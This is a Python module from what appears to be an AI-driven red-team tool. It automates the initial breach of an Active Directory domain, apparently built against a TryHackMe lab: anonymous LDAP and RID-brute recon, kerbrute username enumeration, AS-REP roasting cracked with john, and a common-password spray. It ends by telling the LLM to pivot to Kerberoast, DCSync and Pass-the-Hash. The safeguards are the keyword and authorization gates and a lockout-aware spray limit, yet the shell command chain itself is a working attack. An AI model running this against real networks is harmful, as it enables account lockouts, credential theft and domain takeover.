"""Deterministic Active Directory BREACH chain (initial-access phase).

Complements the F205 domain-takeover chain (skill ``active-directory-roast`` /
``cwe-detection/ad_roast_hook.py``): where that one assumes a foothold and drives
to Domain Admin, THIS module owns the step BEFORE it — obtaining the FIRST valid
domain credential from nothing but network access, the way TryHackMe's
"Introduction to Active Directory Breaching" teaches it::

    recon -> username enumeration -> AS-REP roast -> **password spraying**

The gap it closes (observed live on that room, where the takeover chain never
fired because the prompt said "breach" not "roast"): the takeover chain sprays
already-cracked passwords for REUSE and AS-REP-roasts preauth-disabled accounts,
but it never sprays a list of COMMON / seasonal passwords across the enumerated
users — which is exactly how the foothold is obtained when NO account has
Kerberos pre-auth disabled. This module adds that deterministic common-password
spray, then reports the recovered foothold credentials.

It runs as a pre_hook (``cwe-detection/ad_breach_hook.py``) BEFORE the LLM, so the
foothold never depends on a small local model driving a multi-step Windows chain
(the project thesis: determinism drives, the model narrates). Once a credential
is recovered, the model continues with the takeover (the ``active-directory-roast``
chain covers DCSync / Pass-the-Hash).

Safety / scope: gated behind the explicit "active directory breach" keyword +
``KRYON_RED_TEAM`` + written authorization. Enumeration is read-only
Kerberos/LDAP; the spray uses Kerberos pre-auth (kerbrute) ONE password across the
user list at a time. **Password spraying can lock accounts** — the candidate list
is capped (``KRYON_AD_SPRAY_LIMIT``, default 12) and can be disabled entirely
(``KRYON_AD_SPRAY=0``) so a real engagement controls lockout risk.
"""

from __future__ import annotations

import os
import re
import subprocess
from typing import Any
from urllib.parse import urlparse

# kerbrute / GetNPUsers colourise their output; strip ANSI before parsing or the
# username/login regexes silently miss (the bug that made a live breach run's
# ``grep VALID USERNAME`` come back empty even though kerbrute had printed hits).
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")

_ROCKYOU = "/usr/share/wordlists/rockyou.txt"
_USERENUM_WL = "/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt"

# Common AD accounts seeded into the userlist so a service/default account is
# tried even when a big userenum wordlist wouldn't reach it in the time budget.
_SEED_USERS: tuple[str, ...] = (
    "administrator",
    "guest",
    "krbtgt",
    "backup",
    "svc-admin",
    "svc_admin",
    "svc-backup",
    "service",
    "sqlservice",
    "sql_svc",
    "websvc",
    "admin",
    "helpdesk",
    "it-admin",
    "info",
    "support",
)

# Curated common / seasonal spray passwords, ordered most-likely-first. Hardcoded
# (deterministic) so the breach is reproducible and unit-testable; domain-derived
# candidates are appended at runtime by ``common_password_candidates``.
_COMMON_PASSWORDS: tuple[str, ...] = (
    "Password1",
    "Password123",
    "Password1!",
    "P@ssw0rd",
    "P@ssw0rd!",
    "Welcome1",
    "Welcome123",
    "Welcome2025!",
    "Changeme123",
    "Change.Me123",
    "Company123",
    "Summer2025!",
    "Winter2025!",
    "Spring2025!",
    "Autumn2025!",
    "Summer2024!",
    "Winter2024!",
    "Spring2026!",
    "Password2025!",
    "Letmein123",
)

_MIN_PW_LEN = 6


def _strip_ansi(text: str) -> str:
    """Remove ANSI colour escape sequences so parsers see plain text."""
    return _ANSI_RE.sub("", text or "")


def base_domain_name(domain: str) -> str:
    """Left-most label of a domain, capitalised — ``thm.loc`` -> ``Thm``.

    Used to build the domain-flavoured spray candidates (companies love
    ``<Company>2025!``). Empty input -> "".
    """
    label = (domain or "").strip().lower().split(".")[0]
    return label.capitalize() if label else ""


def common_password_candidates(domain: str = "", *, limit: int = 12) -> list[str]:
    """Deterministic, ordered spray list: curated commons + domain-flavoured.

    ``limit`` caps the total (lockout safety — every extra password is another
    auth attempt per user). Pure + stable for testing: no clock/RNG.
    """
    out: list[str] = list(_COMMON_PASSWORDS)
    stem = base_domain_name(domain)
    if stem:
        # Domain-flavoured candidates go FIRST (highest hit-rate in practice).
        out = [f"{stem}2025!", f"{stem}@123", f"{stem}123!", *out]
    seen: set[str] = set()
    uniq: list[str] = []
    for pw in out:
        if pw and len(pw) >= _MIN_PW_LEN and pw not in seen:
            seen.add(pw)
            uniq.append(pw)
    if limit > 0:
        uniq = uniq[:limit]
    return uniq


def parse_valid_usernames(kerbrute_output: str) -> list[str]:
    """Extract usernames from ``kerbrute userenum`` output (ANSI-safe).

    Matches ``[+] VALID USERNAME: user@domain`` lines and returns the bare
    lower-cased usernames, de-duplicated in first-seen order.
    """
    text = _strip_ansi(kerbrute_output)
    seen: set[str] = set()
    users: list[str] = []
    for m in re.finditer(r"VALID USERNAME:\s*([^@\s]+)@", text, re.I):
        u = m.group(1).lower()
        if u and u not in seen:
            seen.add(u)
            users.append(u)
    return users


def parse_spray_logins(kerbrute_output: str, password: str) -> list[tuple[str, str]]:
    """Extract ``(user, password)`` from ``kerbrute passwordspray`` output.

    ``password`` is the one being sprayed this round (kerbrute prints the user
    on a ``VALID LOGIN:`` line, sometimes ``user@domain`` or ``DOMAIN\\user``).
    ANSI-safe; de-duplicated.
    """
    text = _strip_ansi(kerbrute_output)
    seen: set[str] = set()
    out: list[tuple[str, str]] = []
    for m in re.finditer(r"VALID LOGIN:\s*([A-Za-z0-9._\\@-]+)", text, re.I):
        raw = m.group(1)
        user = raw.split("\\")[-1].split("@")[0].strip().lower()
        if user and user not in seen:
            seen.add(user)
            out.append((user, password))
    return out


def dedup_creds(creds: list[tuple[str, str]]) -> list[tuple[str, str]]:
    """De-duplicate (user, password) pairs case-insensitively on the user."""
    seen: set[tuple[str, str]] = set()
    out: list[tuple[str, str]] = []
    for u, p in creds:
        key = (u.lower(), p)
        if u and p and key not in seen:
            seen.add(key)
            out.append((u.lower(), p))
    return out


def _sh(cmd: str, timeout: int) -> str:
    """Run a shell command best-effort; return stdout ("" on any failure)."""
    try:
        return subprocess.run(  # noqa: S602 — fixed offensive cmds, target gated by keyword+RED_TEAM
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        ).stdout
    except Exception:  # noqa: BLE001
        return ""


def _q(value: str) -> str:
    """Single-quote a shell arg, escaping embedded single quotes."""
    return "'" + str(value).replace("'", "'\\''") + "'"


def host_of(target: str) -> str:
    """Bare host from a target string (URL, host:port, or IP)."""
    target = (target or "").strip()
    if not target:
        return ""
    if "://" in target:
        return urlparse(target).hostname or ""
    return target.split("/")[0].split(":")[0]


def resolve_domain(host: str) -> str:
    """Unauth LDAP rootDSE -> dotted domain (``thm.loc``), or "" if not a DC."""
    out = _sh(f"ldapsearch -x -H ldap://{host} -s base namingContexts 2>/dev/null", 20)
    m = re.search(r"DC=[A-Za-z0-9-]+(?:,DC=[A-Za-z0-9-]+)+", out, re.I)
    if not m:
        return ""
    return m.group(0).replace("DC=", "").replace("dc=", "").replace(",", ".").lower()


def userenum_wordlist() -> str:
    """Wordlist for kerbrute userenum. An operator-provided OSINT list
    (``KRYON_AD_USERLIST`` -> an existing file) wins over the generic honeypot
    default — a real engagement enumerates the harvested employee names
    (LinkedIn/GitHub/breach data), which a generic list never contains. Falls
    back to the honeypot list when unset or the path doesn't exist."""
    custom = os.environ.get("KRYON_AD_USERLIST", "").strip()
    if custom and os.path.isfile(custom):
        return custom
    return _USERENUM_WL


def enum_users(host: str, domain: str) -> list[str]:
    """Enumerate candidate domain users: OSINT/RID-brute + kerbrute + seed."""
    users: list[str] = list(_SEED_USERS)
    # Null-session SAMR RID brute — exact when the DC allows it (real names a
    # wordlist would never guess). nxc prints ``DOMAIN\\user (SidTypeUser)``.
    rid = _sh(f"nxc smb {host} -u '' -p '' --rid-brute 2>/dev/null", 120)
    for line in _strip_ansi(rid).splitlines():
        if "SidTypeUser" not in line or "\\" not in line:
            continue
        u = line.split("\\")[-1].split("(")[0].strip().lower()
        if u and not u.endswith("$") and u not in ("guest", "krbtgt"):
            users.append(u)
    # kerbrute userenum — validates the OSINT/honeypot wordlist against the KDC
    # (Kerberos pre-auth; no lockouts). This is where the harvested employee
    # names become confirmed domain accounts.
    wordlist = userenum_wordlist()
    if _sh("command -v kerbrute", 5).strip():
        out = _sh(
            f"timeout 120 kerbrute userenum -d {domain} --dc {host} {_q(wordlist)} 2>/dev/null",
            140,
        )
        users.extend(parse_valid_usernames(out))
    seen: set[str] = set()
    uniq: list[str] = []
    for u in users:
        if u and u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq


def asrep_roast(host: str, domain: str, users: list[str]) -> list[tuple[str, str]]:
    """AS-REP roast preauth-disabled accounts and crack offline (john on CPU)."""
    if not users:
        return []
    _sh("printf '%s\\n' " + " ".join(_q(u) for u in users[:1000]) + " > /tmp/adb_users.txt", 5)
    _sh(f"[ -f {_ROCKYOU} ] || gunzip -kf {_ROCKYOU}.gz 2>/dev/null", 30)
    got = _sh(
        f"GetNPUsers.py -no-pass -dc-ip {host} -usersfile /tmp/adb_users.txt {domain}/ 2>/dev/null "
        "| grep -a krb5asrep > /tmp/adb_asrep.txt; test -s /tmp/adb_asrep.txt && echo y",
        240,
    )
    if "y" not in got:
        return []
    # john, NOT hashcat — no GPU in the container; hashcat exits 0 without cracking.
    _sh(f"john --format=krb5asrep --wordlist={_ROCKYOU} /tmp/adb_asrep.txt 2>/dev/null", 180)
    shown = _sh("john --show --format=krb5asrep /tmp/adb_asrep.txt 2>/dev/null", 20)
    creds: list[tuple[str, str]] = []
    for m in re.finditer(r"\$krb5asrep\$\d+\$([^@]+)@[^:]+:(\S+)", _strip_ansi(shown)):
        creds.append((m.group(1).lower(), m.group(2)))
    return dedup_creds(creds)


def common_password_spray(dc: str, domain: str, users: list[str], passwords: list[str]) -> list[tuple[str, str]]:
    """Spray each common password across the user list (Kerberos pre-auth).

    ONE password across all users per round (spray pattern), via kerbrute
    passwordspray — fast, and Kerberos pre-auth avoids nxc-SMB's ``(Guest)``
    false positives. Returns the recovered ``(user, password)`` foothold creds.
    """
    if not users or not passwords:
        return []
    if not _sh("command -v kerbrute", 5).strip():
        return []
    _sh("printf '%s\\n' " + " ".join(_q(u) for u in users[:1000]) + " > /tmp/adb_spray_users.txt", 5)
    found: list[tuple[str, str]] = []
    for pw in passwords:
        out = _sh(
            f"kerbrute passwordspray -d {domain} --dc {dc} /tmp/adb_spray_users.txt {_q(pw)} 2>/dev/null",
            120,
        )
        found.extend(parse_spray_logins(out, pw))
    return dedup_creds(found)


def _spray_enabled() -> bool:
    # Spraying is ACTIVE and can lock accounts; runs only in the explicitly
    # authorized offensive context (this skill is keyword + RED_TEAM gated).
    # Opt out with KRYON_AD_SPRAY=0.
    return os.environ.get("KRYON_AD_SPRAY", "1").lower() not in ("0", "false", "no")


def _spray_limit() -> int:
    """Operator ceiling on spray passwords. Further reduced by the domain
    lockout policy in ``safe_spray_limit`` — this is only the upper bound."""
    try:
        return max(0, int(os.environ.get("KRYON_AD_SPRAY_LIMIT", "5")))
    except ValueError:
        return 5


def lockout_threshold(host: str) -> int | None:
    """Domain account-lockout threshold via null-session ``--pass-pol``.

    Returns the integer threshold, or None when it can't be read OR is 0
    (lockout disabled). Kerberos pre-auth failures increment the SAME
    ``badPwdCount`` as SMB, so this bounds a lockout-safe spray."""
    out = _strip_ansi(_sh(f"nxc smb {host} -u '' -p '' --pass-pol 2>/dev/null", 30))
    m = re.search(r"Account Lockout Threshold\s*:?\s*(\d+)", out, re.I)
    if not m:
        return None
    n = int(m.group(1))
    return n if n > 0 else None


def safe_spray_limit(host: str) -> tuple[int, str]:
    """Lockout-SAFE number of spray passwords + a human note.

    Never spray up to the lockout threshold: stay 2 below it (margin for any
    pre-existing failed logins). When the policy can't be read, cap HARD at 2
    (unknown → assume a tight threshold). Fixes the live lockout a 12-password
    blind spray caused on THM 'Intro to AD Breaching' (locked all 42 employees)."""
    ceiling = _spray_limit()
    thr = lockout_threshold(host)
    if thr is None:
        return min(ceiling, 2), "lockout policy unreadable -> hard cap 2 (lockout-safe)"
    safe = max(1, thr - 2)
    return min(ceiling, safe), f"lockout threshold {thr} -> capped to {min(ceiling, safe)}"


def run_breach(ctx: dict[str, Any] | str) -> str:
    """Deterministic AD breach: recon -> user-enum -> AS-REP roast -> spray.

    ``ctx`` is the pre_hook context dict (``ctx.target``/``ctx.host``) or a bare
    target string. Returns an authoritative report of the recovered foothold
    credentials for the LLM to build on (do NOT re-run these steps).
    """
    if isinstance(ctx, str):
        target = ctx
    else:
        target = str((ctx or {}).get("target") or (ctx or {}).get("host") or "")

    host = host_of(target)
    if not host:
        return "[AD-BREACH] no target host in ctx — skipped"

    domain = resolve_domain(host)
    if not domain:
        return f"[AD-BREACH] {host} did not answer LDAP rootDSE — not a reachable Domain Controller"

    report = f"[AD-BREACH deterministic initial access] DC={host}  domain={domain}\n"
    users = enum_users(host, domain)
    report += f"  - enumerated {len(users)} candidate domain users\n"

    creds: list[tuple[str, str]] = []

    # 1. AS-REP roast — a preauth-disabled account is an instant foothold, no spray.
    asrep = asrep_roast(host, domain, users)
    if asrep:
        report += "  - AS-REP foothold: " + ", ".join(f"{u}:{p}" for u, p in asrep) + "\n"
        creds = dedup_creds(creds + asrep)

    # 2. Common-password spray — lockout-SAFE (capped below the domain policy).
    if _spray_enabled():
        limit, note = safe_spray_limit(host)
        pw_list = common_password_candidates(domain, limit=limit)
        report += (
            f"  - spraying {len(pw_list)} common passwords across {len(users)} users "
            f"(kerbrute Kerberos pre-auth; {note})\n"
        )
        sprayed = common_password_spray(host, domain, users, pw_list)
        if sprayed:
            report += "  - SPRAY foothold: " + ", ".join(f"{u}:{p}" for u, p in sprayed) + "\n"
            creds = dedup_creds(creds + sprayed)
    else:
        report += "  - password spray DISABLED (KRYON_AD_SPRAY=0) — enum/AS-REP only\n"

    if not creds:
        return (
            report + "  - no credential recovered. Next (lockout-safe — do NOT blind-spray more, it "
            "LOCKS accounts): DISCOVER a specific password via read-only credential hunting (LDAP "
            "description fields, null-session SMB shares, web/Gitea configs), then spray THAT single "
            "password across the users. AS-REP exhausted; consider auth coercion (Responder).\n"
        )

    report += (
        f"\nCONFIRMED foothold ({len(creds)} credential(s) recovered) — do NOT re-enumerate or re-spray. "
        "Next: authenticate with these creds and pivot to domain takeover (the active-directory-roast chain: "
        "authenticated enum -> Kerberoast -> DCSync -> Pass-the-Hash)."
    )
    return report
